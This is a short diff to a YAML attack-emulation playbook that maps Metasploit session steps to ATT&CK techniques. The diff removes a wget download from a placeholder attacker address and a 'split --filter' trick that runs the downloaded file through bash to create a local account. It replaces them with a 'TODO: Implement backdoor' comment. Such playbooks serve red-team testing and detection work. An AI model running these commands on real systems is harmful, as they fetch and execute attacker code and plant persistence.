@@ -181,24 +181,7 @@ commands:
       tactics: "Discovery"
       technique_name: "System Owner/User Discovery"
 
-
-  - type: msf-session
-    session: "foothold"
-    cmd: "cd /root; wget -O README.txt http://$ATTACKER_ADDRESS/README.txt.2"
-    end_str: "PWN >"
-    metadata:
-      techniques: "T1105,T1136.001"
-      tactics: "Command and Control,Persistence"
-      technique_name:"Ingress Tool Transfer,Create Account: Local Account"
-
-  - type: msf-session
-    cmd: split --filter="cat $FILE | xargs bash -c " -C 2000 /root/README.txt
-    session: "foothold"
-    end_str: "PWN >"
-    metadata:
-      techniques: "T1218,T1136.001"
-      tactics: "Defense Evasion,Persistence"
-      technique_name: "System Binary Proxy Execution,Create Account: Local Account"
+  # TODO: Implement backdoor
 
   - type: msf-session
     cmd: rm /root/README.txt
